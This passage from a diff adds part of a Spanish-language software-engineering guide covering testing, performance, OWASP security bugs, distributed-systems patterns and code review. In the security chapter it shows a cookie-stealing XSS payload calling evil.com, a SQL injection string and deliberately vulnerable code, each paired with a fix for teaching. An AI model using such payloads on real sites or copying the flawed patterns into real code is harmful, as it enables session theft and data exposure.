+    errors: list[str] = field(default_factory=list)
+
+<span class="kw">def</span> <span class="fn">validate_password</span>(password: str) -> ValidationResult:
+    errors = []
+    <span class="kw">if</span> len(password) < <span class="nm">8</span>:
+        errors.append(<span class="str">"Password must be at least 8 characters"</span>)
+    <span class="kw">if not</span> any(c.isupper() <span class="kw">for</span> c <span class="kw">in</span> password):
+        errors.append(<span class="str">"Password must contain at least one uppercase letter"</span>)
+    <span class="kw">return</span> ValidationResult(is_valid=len(errors) == <span class="nm">0</span>, errors=errors)
+
+<span class="cm"># PASO 3: REFACTOR — el diseño ya es correcto gracias a los tests
+# Podemos añadir reglas, cambiar la implementación, sin miedo
+# El test es la especificación viva del comportamiento esperado</span></code></pre>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>El testing está directamente relacionado con el diseño. El <strong>Dependency Inversion
+                                Principle</strong> hace que el código sea testeable: si el código depende de
+                            abstracciones inyectadas,
+                            se pueden reemplazar con implementaciones de test. La <strong>Hexagonal
+                                Architecture</strong> tiene este
+                            beneficio por diseño: el dominio no tiene dependencias de infraestructura, por lo que se
+                            puede testear sin
+                            BD ni servicios externos.</p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     CAP 08: PERFORMANCE Y ESCALABILIDAD
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap08">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 08</span>
+                        <h2>Performance y Escalabilidad</h2>
+                    </div>
+
+                    <p>La regla de oro de la performance es una: <strong>medir antes de optimizar</strong>. La
+                        optimización
+                        prematura no es solo un desperdicio de tiempo — activamente empeora el código al añadir
+                        complejidad para
+                        resolver problemas que no existen o que no están donde asumes.</p>
+
+                    <div class="callout danger">
+                        <div class="callout-icon"></div>
+                        <p><strong>"Premature optimization is the root of all evil"</strong> — Knuth. El 97% del tiempo,
+                            la
+                            performance no importa. El 3% que importa, debes medir para saber dónde está. Casi nunca
+                            está donde crees
+                            que está.</p>
+                    </div>
+
+                    <h3 id="profiling">Profiling: Encontrar el Cuello de Botella Real</h3>
+
+                    <pre data-lang="python"><code><span class="cm"># Profiling en Python — encontrar dónde está realmente el tiempo</span>
+<span class="kw">import</span> cProfile, pstats, io
+
+<span class="kw">def</span> <span class="fn">profile</span>(func):
+    <span class="str">"""Decorator para profilear cualquier función"""</span>
+    <span class="kw">def</span> <span class="fn">wrapper</span>(*args, **kwargs):
+        pr = cProfile.Profile()
+        pr.enable()
+        result = func(*args, **kwargs)
+        pr.disable()
+
+        s = io.StringIO()
+        ps = pstats.<span class="fn">Stats</span>(pr, stream=s)
+        ps.sort_stats(<span class="str">'cumulative'</span>)
+        ps.<span class="fn">print_stats</span>(<span class="nm">20</span>)  <span class="cm"># Top 20 funciones por tiempo acumulado</span>
+        print(s.getvalue())
+        <span class="kw">return</span> result
+    <span class="kw">return</span> wrapper
+
+<span class="cm"># Caso real: la app tarda 3s en cargar un dashboard
+# Suposición del dev: "es el query SQL, hay que optimizarlo"
+# Resultado del profiler: el query tarda 50ms
+#                         la serialización JSON tarda 2.8s
+#                         el problema estaba en el serializer, no en SQL</span>
+
+<span class="cm"># ─────────────────────────────────────────────────────────
+# py-spy: profiler de producción sin modificar el código</span>
+<span class="cm"># py-spy top --pid &lt;PID&gt;  → live view de qué hace la app ahora
+# py-spy record -o profile.svg --pid &lt;PID&gt;  → flame graph</span>
+
+<span class="cm"># En Node.js:
+# node --prof app.js → genera isolate-*.log
+# node --prof-process isolate-*.log → análisis del V8 profiler</span>
+
+<span class="cm"># En PostgreSQL: queries lentas en logs
+# log_min_duration_statement = 100   ← logear queries > 100ms
+# pg_stat_statements extension        ← estadísticas de todas las queries</span></code></pre>
+
+                    <h3 id="caching">Caching: La Complejidad que Nadie Menciona</h3>
+                    <p>Phil Karlton dijo que hay dos problemas difíciles en CS: invalidación de caché y nombrar cosas.
+                        El caching
+                        mejora drásticamente la performance — pero introduce un sistema distribuido adicional con su
+                        propio conjunto
+                        de failure modes.</p>
+
+                    <div class="diagram">
+                        <pre><code>
+  Estrategias de Caching y Sus Trade-offs
+
+  CACHE-ASIDE (más común):
+  App → Cache hit? → Retornar
+  App → Cache miss → BD → Guardar en cache → Retornar
+  Pros: Solo cachea datos leídos, app controla el cache
+  Cons: Cache miss = latencia extra, cold start lento
+
+  READ-THROUGH:
+  App → Cache (que consulta la BD si necesario) → Retornar
+  Pros: Transparente para la app
+  Cons: Cache debe soportar la lógica de lectura de BD
+
+  WRITE-THROUGH:
+  App → Cache → BD (síncronamente)
+  Pros: Cache siempre actualizado
+  Cons: Latencia de escritura mayor, cachea datos poco leídos
+
+  WRITE-BEHIND (write-back):
+  App → Cache → Retornar inmediatamente
+  BD actualizada en batch asíncronamente
+  Pros: Escrituras ultra-rápidas
+  Cons: Riesgo de pérdida de datos si el cache muere antes del flush
+
+  ┌──────────────────────────────────────────────────────────┐
+  │  Cache Invalidation: las estrategias reales              │
+  │                                                          │
+  │  TTL (Time-To-Live):                                     │
+  │  Simple, predecible. El dato puede ser stale hasta TTL.  │
+  │  Elegir TTL según tolerancia a staleness del negocio.    │
+  │                                                          │
+  │  Event-driven invalidation:                              │
+  │  DELETE cache key cuando el dato cambia.                 │
+  │  Requiere que todas las escrituras invaliden el cache.   │
+  │  Más complejo, más fresco.                               │
+  │                                                          │
+  │  Cache-aside con versión:                                │
+  │  Key incluye versión del dato. Nunca invalidar —         │
+  │  la nueva versión tiene una key diferente.               │
+  └──────────────────────────────────────────────────────────┘
+</code></pre>
+                    </div>
+
+                    <h3 id="n1">El Problema N+1: El Bug de Performance más Común</h3>
+
+                    <pre data-lang="python"><code><span class="cm"># N+1 query: el problema más costoso y más fácil de introducir</span>
+
+<span class="cm"># ❌ N+1: 1 query para los posts + N queries para los autores</span>
+<span class="cm"># Con 100 posts → 101 queries a la BD</span>
+posts = db.<span class="fn">query</span>(<span class="str">"SELECT * FROM posts LIMIT 100"</span>)  <span class="cm"># 1 query</span>
+<span class="kw">for</span> post <span class="kw">in</span> posts:
+    post.author = db.<span class="fn">query</span>(                           <span class="cm"># N queries</span>
+        <span class="str">"SELECT * FROM users WHERE id = ?"</span>, post.author_id
+    )
+
+<span class="cm"># ✓ Eager loading: 2 queries total, independientemente de N</span>
+posts = db.<span class="fn">query</span>(<span class="str">"SELECT * FROM posts LIMIT 100"</span>)
+author_ids = [p.author_id <span class="kw">for</span> p <span class="kw">in</span> posts]
+authors = db.<span class="fn">query</span>(<span class="str">"SELECT * FROM users WHERE id = ANY(?)"</span>, author_ids)
+author_map = {a.id: a <span class="kw">for</span> a <span class="kw">in</span> authors}
+<span class="kw">for</span> post <span class="kw">in</span> posts:
+    post.author = author_map.get(post.author_id)
+
+<span class="cm"># ✓ JOIN: 1 query, lo más eficiente</span>
+posts_with_authors = db.<span class="fn">query</span>(<span class="str">"""
+    SELECT p.*, u.name as author_name, u.email as author_email
+    FROM posts p
+    JOIN users u ON u.id = p.author_id
+    LIMIT 100
+"""</span>)
+
+<span class="cm"># En ORMs: Django → select_related(), prefetch_related()
+#           SQLAlchemy → joinedload(), selectinload()
+#           Hibernate → @ManyToOne(fetch = FetchType.EAGER)
+#           Prisma → include: { author: true }
+#
+# Señal de N+1 en producción: las queries más frecuentes son
+# "SELECT * FROM users WHERE id = ?" con diferentes IDs</span></code></pre>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>Performance y escalabilidad conectan con todos los niveles del stack. El N+1 se resuelve en
+                            la capa de
+                            datos, pero se previene en el diseño de la API (GraphQL DataLoader, REST con fields de
+                            inclusion). El
+                            caching implementa los principios de <strong>consistencia eventual</strong> de sistemas
+                            distribuidos. El
+                            profiling muestra que la mayoría de problemas de performance están en la <strong>base de
+                                datos</strong> —
+                            haciendo el Capítulo 06 el más importante para el performance del sistema.</p>
+                    </div>
+                </section>
+
+
+                <!-- ════════════════════════════════════════
+     CAP 09: SEGURIDAD
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap09">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 09</span>
+                        <h2>Seguridad para Ingenieros</h2>
+                    </div>
+
+                    <p>La seguridad no es responsabilidad exclusiva de un equipo de seguridad. Es una propiedad del
+                        código que
+                        cada ingeniero escribe todos los días. Los vulnerabilidades más costosas de la historia no
+                        fueron ataques
+                        sofisticados — fueron errores básicos de validación de input, configuración incorrecta, o
+                        confianza
+                        implícita en datos externos.</p>
+
+                    <h3 id="owasp">OWASP Top 10: Los Bugs que Más Importan</h3>
+
+                    <h4>1. SQL INJECTION: AÚN EL MÁS COMÚN Y EL MÁS EVITABLE</h4>
+                    <pre data-lang="python"><code><span class="cm"># ❌ SQL Injection — un bug que destruyó empresas enteras</span>
+user_input = request.GET.get(<span class="str">'user_id'</span>)  <span class="cm"># "1 OR 1=1 --"</span>
+query = f<span class="str">"SELECT * FROM users WHERE id = {user_input}"</span>
+<span class="cm"># Resultado: SELECT * FROM users WHERE id = 1 OR 1=1 --
+# Retorna TODOS los usuarios. Con DROP TABLE: elimina la BD.</span>
+
+<span class="cm"># ✓ Parameterized queries — siempre, sin excepción</span>
+user_id = request.GET.get(<span class="str">'user_id'</span>)
+user = db.<span class="fn">fetchone</span>(<span class="str">"SELECT * FROM users WHERE id = %s"</span>, (user_id,))
+<span class="cm"># El driver de BD escapa el parámetro automáticamente
+# La query y los datos nunca se concatenan como strings</span>
+
+<span class="cm"># ✓ ORM: parameterized por diseño</span>
+user = User.objects.<span class="fn">get</span>(id=user_id)  <span class="cm"># Django — nunca inyectable</span>
+user = session.<span class="fn">query</span>(User).<span class="fn">filter</span>(User.id == user_id).<span class="fn">first</span>()  <span class="cm"># SQLAlchemy</span>
+
+<span class="cm"># Cuándo puede fallar incluso con ORM:
+# raw() queries, execute() con f-strings, order_by() con input del usuario</span>
+<span class="cm"># ❌ User.objects.raw(f"SELECT * FROM users ORDER BY {sort_field}")</span>
+<span class="cm"># ✓  allowlist = ['name', 'email', 'created_at']
+#    if sort_field not in allowlist: raise ValueError
+#    User.objects.order_by(sort_field)</span></code></pre>
+
+                    <h4>2. XSS: CROSS-SITE SCRIPTING</h4>
+                    <pre data-lang="typescript"><code><span class="cm">// ❌ XSS Reflejado: input del usuario insertado sin escapar en HTML</span>
+<span class="cm">// URL: /search?q=&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</span>
+<span class="kw">const</span> query = new URLSearchParams(window.location.search).get(<span class="str">'q'</span>)
+document.getElementById(<span class="str">'results'</span>).innerHTML = <span class="str">`Results for: ${query}`</span>
+<span class="cm">// El script se ejecuta en el navegador de la víctima
+// Roba cookies, sessionStorage, LocalStorage, puede hacer requests como el usuario</span>
+
+<span class="cm">// ✓ Escapar siempre el contenido dinámico</span>
+<span class="kw">function</span> <span class="fn">escapeHtml</span>(text: string): string {
+  <span class="kw">const</span> div = document.<span class="fn">createElement</span>(<span class="str">'div'</span>)
+  div.textContent = text   <span class="cm">// textContent escapa automáticamente</span>
+  <span class="kw">return</span> div.innerHTML
+}
+<span class="cm">// Mejor: usar frameworks (React, Vue, Angular) que escapan por defecto
+// dangerouslySetInnerHTML en React es la señal de alarma — nunca con input de usuario</span>
+
+<span class="cm">// ✓ Content Security Policy: el seguro adicional</span>
+<span class="cm">// Header HTTP que define de dónde puede cargar scripts el navegador:</span>
+<span class="cm">// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com
+// Aunque el XSS se inyecte, el browser lo bloquea si no viene de la allowlist</span></code></pre>
+
+                    <h4>3. INSECURE DIRECT OBJECT REFERENCE (IDOR)</h4>
+                    <pre
+                        data-lang="python"><code><span class="cm"># El bug de autorización más común — y el más fácil de introducir</span>
+
+<span class="cm"># ❌ IDOR: cualquier usuario puede acceder a cualquier orden</span>
+<span class="k2">@app.get</span>(<span class="str">"/orders/{order_id}"</span>)
+<span class="kw">async def</span> <span class="fn">get_order</span>(order_id: int, current_user: User = Depends()):
+    order = <span class="kw">await</span> Order.get(order_id)  <span class="cm"># Falta verificar ownership!</span>
+    <span class="kw">return</span> order
+<span class="cm"># GET /orders/12345 → devuelve la orden 12345 aunque sea de otro usuario
+# El atacante itera IDs: /orders/1, /orders/2, /orders/3...</span>
+
+<span class="cm"># ✓ Siempre filtrar por el usuario autenticado</span>
+<span class="k2">@app.get</span>(<span class="str">"/orders/{order_id}"</span>)
+<span class="kw">async def</span> <span class="fn">get_order</span>(order_id: int, current_user: User = Depends()):
+    order = <span class="kw">await</span> Order.<span class="fn">get</span>(id=order_id, user_id=current_user.id)
+    <span class="kw">if not</span> order:
+        <span class="kw">raise</span> HTTPException(status_code=<span class="nm">404</span>)  <span class="cm"># 404, no 403 — no revelar existencia</span>
+    <span class="kw">return</span> order
+
+<span class="cm"># ✓ Para admins que SÍ pueden ver cualquier orden: verificar el rol explícitamente</span>
+<span class="k2">@app.get</span>(<span class="str">"/admin/orders/{order_id}"</span>)
+<span class="k2">@require_role</span>(<span class="str">"admin"</span>)
+<span class="kw">async def</span> <span class="fn">admin_get_order</span>(order_id: int, current_user: User = Depends()):
+    <span class="kw">return await</span> Order.<span class="fn">get</span>(order_id)  <span class="cm"># Admin puede ver cualquier orden</span></code></pre>
+
+                    <h4>4. MASS ASSIGNMENT: EL BUG QUE COMPROMETIÓ GITHUB</h4>
+                    <pre
+                        data-lang="python"><code><span class="cm"># Mass assignment: el atacante envía campos que no debería poder modificar</span>
+
+<span class="cm"># ❌ Mass assignment: aceptar todo el body directamente</span>
+<span class="k2">@app.put</span>(<span class="str">"/users/me"</span>)
+<span class="kw">async def</span> <span class="fn">update_profile</span>(body: dict, current_user: User = Depends()):
+    <span class="kw">await</span> user_repo.<span class="fn">update</span>(current_user.id, **body)
+<span class="cm"># Un atacante envía: {"name": "John", "is_admin": true, "credits": 99999}
+# El ORM actualiza todos esos campos sin discriminación</span>
+
+<span class="cm"># ✓ Explicit DTOs: solo los campos permitidos pueden cambiar</span>
+<span class="kw">from</span> pydantic <span class="kw">import</span> BaseModel
+
+<span class="kw">class</span> <span class="fn">UpdateProfileDTO</span>(BaseModel):
+    name: str | None = None
+    bio: str | None = None
+    avatar_url: str | None = None
+    <span class="cm"># is_admin, credits, role → no están en el DTO → imposible modificarlos</span>
+
+<span class="k2">@app.put</span>(<span class="str">"/users/me"</span>)
+<span class="kw">async def</span> <span class="fn">update_profile</span>(body: UpdateProfileDTO, current_user: User = Depends()):
+    <span class="kw">await</span> user_repo.<span class="fn">update</span>(current_user.id, body.<span class="fn">model_dump</span>(exclude_unset=<span class="kw">True</span>))</code></pre>
+
+                    <h3 id="crypto">Cryptography Práctica: Cuándo Usar Qué</h3>
+
+                    <div class="table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Necesidad</th>
+                                    <th>Solución correcta</th>
+                                    <th>Solución incorrecta</th>
+                                    <th>Por qué importa</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Almacenar contraseñas</td>
+                                    <td class="g">bcrypt, argon2, scrypt</td>
+                                    <td class="r">MD5, SHA-1, SHA-256, cifrado reversible</td>
+                                    <td>bcrypt tiene trabajo configurable — lento por diseño para fuerza bruta</td>
+                                </tr>
+                                <tr>
+                                    <td>Comparar contraseñas/tokens</td>
+                                    <td class="g">hmac.compare_digest() o equivalente</td>
+                                    <td class="r">== o strcmp directo</td>
+                                    <td>Comparación directa es vulnerable a timing attacks</td>
+                                </tr>
+                                <tr>
+                                    <td>Generar tokens seguros</td>
+                                    <td class="g">secrets.token_urlsafe() (Python), crypto.randomBytes() (Node)</td>
+                                    <td class="r">Math.random(), uuid v4 sin crypto</td>
+                                    <td>Math.random() es predecible — no es criptográficamente seguro</td>
+                                </tr>
+                                <tr>
+                                    <td>Cifrar datos en tránsito</td>
+                                    <td class="g">TLS 1.2+ (configurado correctamente)</td>
+                                    <td class="r">TLS 1.0, SSL, cipher suites débiles</td>
+                                    <td>Versiones antiguas tienen vulnerabilidades conocidas</td>
+                                </tr>
+                                <tr>
+                                    <td>Cifrar datos en reposo</td>
+                                    <td class="g">AES-256-GCM (cifrado autenticado)</td>
+                                    <td class="r">AES-ECB, DES, cifrado sin autenticación</td>
+                                    <td>AES-ECB revela patrones en los datos. Sin autenticación: modificable sin
+                                        detección</td>
+                                </tr>
+                                <tr>
+                                    <td>Firmar datos (JWT, webhooks)</td>
+                                    <td class="g">HMAC-SHA256 con clave secreta, RS256 con par de claves</td>
+                                    <td class="r">Algoritmo "none", MD5</td>
+                                    <td>alg:none es una vulnerabilidad clásica de JWT</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>La seguridad aplicada a nivel de código implementa los principios del modelo <strong>Zero
+                                Trust</strong>
+                            arquitectónico: validar cada input (nunca confiar en datos externos), autorización explícita
+                            en cada
+                            endpoint (IDOR), y mínimo privilegio (DTOs explícitos, no mass assignment). Las
+                            vulnerabilidades de
+                            seguridad no son problemas de arquitectura — son problemas de implementación que ninguna
+                            arquitectura
+                            puede prevenir por sí sola.</p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     CAP 10: SISTEMAS DISTRIBUIDOS DÍA A DÍA
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap10">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 10</span>
+                        <h2>Sistemas Distribuidos para el Día a Día</h2>
+                    </div>
+
+                    <p>No necesitas diseñar Kafka para necesitar entender sistemas distribuidos. Cada vez que tu código
+                        hace una
+                        llamada HTTP a un servicio externo, lee de una base de datos remota, o escribe en una cola —
+                        estás operando
+                        en un sistema distribuido con todos sus problemas: fallos de red, latencia variable, mensajes
+                        duplicados, y
+                        estados inconsistentes.</p>
+
+                    <h3 id="idempotency">Idempotencia: El Principio que Salva Datos</h3>
+
+                    <div class="diagram">
+                        <pre><code>
+  Por qué los retries ocurren aunque el servidor respondió exitosamente
+
+  Cliente                    Red                    Servidor
+     │                        │                         │
+     │──POST /payments──────►│──────────────────────►  │
+     │                        │                         │ Procesa pago ✓
+     │                        │◄─── Timeout / Drop ──   │ Envía 200 OK
+     │                        │  (respuesta perdida)    │
+     │   Timeout!             │                         │
+     │──POST /payments──────►│──────────────────────►  │
+     │  (retry)               │                         │ Procesa pago OTRA VEZ ❌
+     │◄──────────────────────│◄────────────────────────│ 201 Created
+
+  El cliente nunca recibió el 200 original.
+  El servidor procesó el pago DOS veces.
+  El cliente tiene razón al reintentar.
+  El servidor tiene razón al procesar.
+  Resultado: cobro duplicado.
+
+  Solución: Idempotency Key
+  El cliente genera un UUID antes del primer intento.
+  Lo envía en cada retry con el MISMO UUID.
+  El servidor: "¿Ya vi este UUID? → Retornar el resultado anterior."
+</code></pre>
+                    </div>
+
+                    <pre data-lang="typescript"><code><span class="cm">// Implementación de idempotency keys en servidor</span>
+<span class="kw">async function</span> <span class="fn">processPayment</span>(
+  req: Request,
+  paymentData: PaymentDTO
+): Promise&lt;PaymentResult&gt; {
+
+  <span class="kw">const</span> idempotencyKey = req.headers[<span class="str">'idempotency-key'</span>]
+  <span class="kw">if</span> (!idempotencyKey) {
+    <span class="kw">throw new</span> BadRequestError(<span class="str">'Idempotency-Key header required'</span>)
+  }
+
+  <span class="cm">// Verificar si ya procesamos esta operación</span>
+  <span class="kw">const</span> cached = <span class="kw">await</span> redis.get(<span class="str">`idempotency:payment:${idempotencyKey}`</span>)
+  <span class="kw">if</span> (cached) {
+    <span class="cm">// Retornar el resultado original — sin re-procesar</span>
+    <span class="kw">return</span> JSON.parse(cached) <span class="kw">as</span> PaymentResult
+  }
+
+  <span class="cm">// Primer intento: procesar y guardar resultado</span>
+  <span class="kw">const</span> result = <span class="kw">await</span> paymentProvider.charge(paymentData)
+
+  <span class="cm">// Guardar por 24 horas (ventana de retries del cliente)</span>
+  <span class="kw">await</span> redis.setex(
+    <span class="str">`idempotency:payment:${idempotencyKey}`</span>,
+    <span class="nm">86400</span>,
+    JSON.stringify(result)
+  )
+
+  <span class="kw">return</span> result
+}
+
+<span class="cm">// Cliente: generar la key ANTES del primer request</span>
+<span class="kw">async function</span> <span class="fn">chargeWithRetry</span>(paymentData: PaymentDTO): Promise&lt;PaymentResult&gt; {
+  <span class="kw">const</span> idempotencyKey = crypto.randomUUID()  <span class="cm">// Generado una vez</span>
+
+  <span class="kw">for</span> (<span class="kw">let</span> attempt = <span class="nm">0</span>; attempt &lt; <span class="nm">3</span>; attempt++) {
+    <span class="kw">try</span> {
+      <span class="kw">return await</span> fetch(<span class="str">'/payments'</span>, {
+        method: <span class="str">'POST'</span>,
+        headers: {
+          <span class="str">'Idempotency-Key'</span>: idempotencyKey,  <span class="cm">// Misma key en cada retry</span>
+          <span class="str">'Content-Type'</span>: <span class="str">'application/json'</span>
+        },
+        body: JSON.stringify(paymentData)
+      })
+    } <span class="kw">catch</span> (error) {
+      <span class="kw">if</span> (attempt === <span class="nm">2</span>) <span class="kw">throw</span> error
+      <span class="kw">await</span> sleep(<span class="nm">Math.pow</span>(<span class="nm">2</span>, attempt) * <span class="nm">1000</span>)  <span class="cm">// Exponential backoff</span>
+    }
+  }
+}</code></pre>
+
+                    <h3 id="retry">Retry con Backoff Exponencial y Circuit Breaker</h3>
+
+                    <pre data-lang="python"><code><span class="cm"># Retry con exponential backoff + jitter — el estándar de producción</span>
+<span class="kw">import</span> asyncio
+<span class="kw">import</span> random
+<span class="kw">from</span> typing <span class="kw">import</span> TypeVar, Callable
+
+T = TypeVar(<span class="str">'T'</span>)
+
+<span class="kw">async def</span> <span class="fn">retry_with_backoff</span>(
+    func: Callable[[], T],
+    max_attempts: int = <span class="nm">3</span>,
+    base_delay: float = <span class="nm">1.0</span>,
+    max_delay: float = <span class="nm">30.0</span>,
+    retryable_exceptions: tuple = (ConnectionError, TimeoutError)
+) -> T:
+    <span class="str">"""
+    Exponential backoff con jitter:
+    intento 1: espera 1s + random(0-0.5s)
+    intento 2: espera 2s + random(0-1s)
+    intento 3: espera 4s + random(0-2s)
+
+    El jitter evita el "thundering herd": si 1000 clientes fallan
+    al mismo tiempo y todos esperan exactamente 2s, el servidor
+    recibe 1000 requests simultáneos al segundo 2 → otro fallo.
+    Con jitter: los 1000 se distribuyen en una ventana de tiempo.
+    """</span>
+    last_exception = None
+
+    <span class="kw">for</span> attempt <span class="kw">in</span> range(max_attempts):
+        <span class="kw">try</span>:
+            <span class="kw">return await</span> func()
+        <span class="kw">except</span> retryable_exceptions <span class="kw">as</span> e:
+            last_exception = e
+            <span class="kw">if</span> attempt == max_attempts - <span class="nm">1</span>:
+                <span class="kw">break</span>
+            delay = min(base_delay * (<span class="nm">2</span> ** attempt), max_delay)
+            jitter = random.uniform(<span class="nm">0</span>, delay * <span class="nm">0.5</span>)
+            <span class="kw">await</span> asyncio.sleep(delay + jitter)
+
+    <span class="kw">raise</span> last_exception
+
+<span class="cm"># ─────────────────────────────────────────────────────────
+# Circuit Breaker: evitar llamadas a servicios que están caídos</span>
+
+<span class="kw">from</span> enum <span class="kw">import</span> Enum
+
+<span class="kw">class</span> <span class="fn">CircuitState</span>(Enum):
+    CLOSED = <span class="str">"closed"</span>       <span class="cm"># Normal: deja pasar las llamadas</span>
+    OPEN = <span class="str">"open"</span>           <span class="cm"># Fallo: rechaza inmediatamente</span>
+    HALF_OPEN = <span class="str">"half_open"</span> <span class="cm"># Probando: deja pasar una llamada</span>
+
+<span class="kw">class</span> <span class="fn">CircuitBreaker</span>:
+    <span class="kw">def</span> <span class="fn">__init__</span>(self, failure_threshold=<span class="nm">5</span>, recovery_timeout=<span class="nm">60</span>):
+        self.state = CircuitState.CLOSED
+        self.failure_count = <span class="nm">0</span>
+        self.failure_threshold = failure_threshold
+        self.recovery_timeout = recovery_timeout
+        self.last_failure_time = None
+
+    <span class="kw">async def</span> <span class="fn">call</span>(self, func):
+        <span class="kw">if</span> self.state == CircuitState.OPEN:
+            <span class="kw">if</span> self.<span class="fn">_should_attempt_recovery</span>():
+                self.state = CircuitState.HALF_OPEN
+            <span class="kw">else</span>:
+                <span class="kw">raise</span> CircuitOpenError(<span class="str">"Circuit is OPEN — service unavailable"</span>)
+        <span class="kw">try</span>:
+            result = <span class="kw">await</span> func()
+            self.<span class="fn">_on_success</span>()
+            <span class="kw">return</span> result
+        <span class="kw">except</span> Exception <span class="kw">as</span> e:
+            self.<span class="fn">_on_failure</span>()
+            <span class="kw">raise</span>
+
+    <span class="kw">def</span> <span class="fn">_on_success</span>(self):
+        self.failure_count = <span class="nm">0</span>
+        self.state = CircuitState.CLOSED
+
+    <span class="kw">def</span> <span class="fn">_on_failure</span>(self):
+        self.failure_count += <span class="nm">1</span>
+        self.last_failure_time = time.time()
+        <span class="kw">if</span> self.failure_count >= self.failure_threshold:
+            self.state = CircuitState.OPEN</code></pre>
+
+                    <div class="arch-rel">
+                        <span class="arch-rel-lbl">Conexión técnica</span>
+                        <p>Los patrones de sistemas distribuidos del día a día implementan principios arquitectónicos
+                            fundamentales:
+                            la idempotencia hace posible el <strong>at-least-once delivery</strong> seguro. El circuit
+                            breaker es el
+                            patrón que implementa la <strong>resiliencia y tolerancia a fallos</strong> a nivel de
+                            código. El
+                            exponential backoff con jitter evita el <strong>thundering herd</strong> que puede convertir
+                            un fallo
+                            temporal en un fallo total en cascada.</p>
+                    </div>
+                </section>
+
+                <!-- ════════════════════════════════════════
+     CAP 11: EL INGENIERO EN EL EQUIPO
+     ════════════════════════════════════════ -->
+                <section class="chapter" id="cap11">
+                    <div class="ch-header">
+                        <span class="ch-badge">CAP. 11</span>
+                        <h2>El Ingeniero en el Equipo</h2>
+                    </div>
+
+                    <p>El código que escribes solo representa una fracción de tu impacto como ingeniero senior. La otra
+                        fracción —
+                        frecuentemente la más grande — viene de cómo trabajas con otros: qué feedback das, cómo
+                        comunicas problemas
+                        técnicos, cómo estimas con honestidad, cómo documentas decisiones que otros necesitarán entender
+                        en dos
+                        años.</p>
+
+                    <h3 id="code-review">Code Reviews que Elevan al Equipo</h3>
+                    <p>Un code review tiene dos objetivos simultáneos: mejorar el código del PR y desarrollar al
+                        ingeniero que lo
+                        escribió. Los reviews que solo logran el primero son revisiones de código. Los que logran ambos
+                        son
+                        inversiones en el equipo.</p>
+
+                    <div class="diagram">
+                        <pre><code>
+  Anatomía de un Code Review Efectivo
+
+  QUÉ REVISAR (por prioridad):
+  ┌────────────────────────────────────────────────────────────┐
+  │ 1. CORRECCIÓN: ¿Hace lo que debe hacer?                    │
+  │    Bugs, edge cases no manejados, errores de lógica        │
+  │                                                            │
+  │ 2. DISEÑO: ¿Es el approach correcto?                       │
+  │    ¿Hay una solución más simple? ¿Introduce acoplamiento?  │
+  │    ¿Se puede testear? ¿Respeta los contratos existentes?   │
+  │                                                            │
+  │ 3. SEGURIDAD: ¿Introduce vulnerabilidades?                 │
+  │    Input validation, autorización, secrets hardcodeados    │
+  │                                                            │
+  │ 4. PERFORMANCE: ¿Hay problemas obvios?                     │
+  │    N+1 queries, algoritmos O(n²) innecesarios              │
+  │                                                            │
+  │ 5. LEGIBILIDAD: ¿Es claro para el siguiente lector?        │
+  │    Nombres, estructura, comentarios donde añaden valor     │
+  └────────────────────────────────────────────────────────────┘
+
+  Convenciones para claridad (prefix en comentarios):
+  [BLOQUEANTE]   → Debe cambiar antes de merge (bug, seguridad)
+  [SUGERENCIA]   → Mejora recomendada, no obligatoria
+  [PREGUNTA]     → No entiendo esto, ayúdame a entender
+  [NIL]          → Observación, no requiere acción (nitpick)
+  [APRENDIZAJE]  → Explicación o recurso para el autor
+</code></pre>
+                    </div>
+
+                    <pre data-lang="markdown"><code><span class="cm"><!-- ❌ Review que critica sin enseñar --></span>
+Esto está mal. Deberías usar una lista aquí.
+
+<span class="cm"><!-- ❌ Review demasiado vago para ser accionable --></span>
+Este código no me parece correcto.
+
+<span class="cm"><!-- ✓ Review que explica, enseña, y propone alternativa --></span>
+[BLOQUEANTE] Este loop tiene un N+1 query: por cada `user` en la lista
+se hace un query separado para obtener su `profile`. Con 1000 usuarios
+esto son 1001 queries a la BD.
+
+Sugerencia:
+```python
+# En vez de:
+for user in users:
+    user.profile = db.get_profile(user.id)  # N queries
+
+# Cargar todos los profiles en una sola query:
+user_ids = [u.id for u in users]
+profiles = db.get_profiles_by_ids(user_ids)  # 1 query
+profile_map = {p.user_id: p for p in profiles}
+for user in users:
+    user.profile = profile_map.get(user.id)
+```
+
+Referencia: https://wiki.company.com/patterns/n-plus-one
+
+<span class="cm"><!-- ✓ Para sugerencias de estilo: no bloquear --></span>
+[NIL] Prefiero nombres más descriptivos aquí (`user_profiles_by_id`
+en vez de `pm`), pero es estético — merge si quieres.
+</code></pre>
+
+                    <h3 id="estimations">Estimaciones Honestas: La Habilidad más Política</h3>
+                    <p>Estimar mal destruye la confianza entre ingenieros y stakeholders. Sobre-estimar crea slack
+                        artificial.
+                        Sub-estimar produce promesas rotas. La meta no es estimar perfectamente — es ser honesto sobre
+                        la
+                        incertidumbre.</p>
+
+                    <div class="diagram">
+                        <pre><code>
+  Por qué los ingenieros siempre sub-estiman: El Planning Fallacy
+
+  Lo que los ingenieros asumen al estimar:
+  • Todo va a funcionar según el plan
+  • Las dependencias estarán listas
+  • No habrá bugs inesperados
+  • No habrá interrupciones (meetings, reviews, preguntas)
+  • El código existente es como lo recuerdo
+  • Los requerimientos no van a cambiar
+
+  Lo que realmente ocurre:
+  • La API de terceros tiene un comportamiento no documentado
+  • El schema de BD necesita una migración no anticipada
+  • Los requirements cambian a mitad de implementación
+  • Los code reviews piden cambios significativos
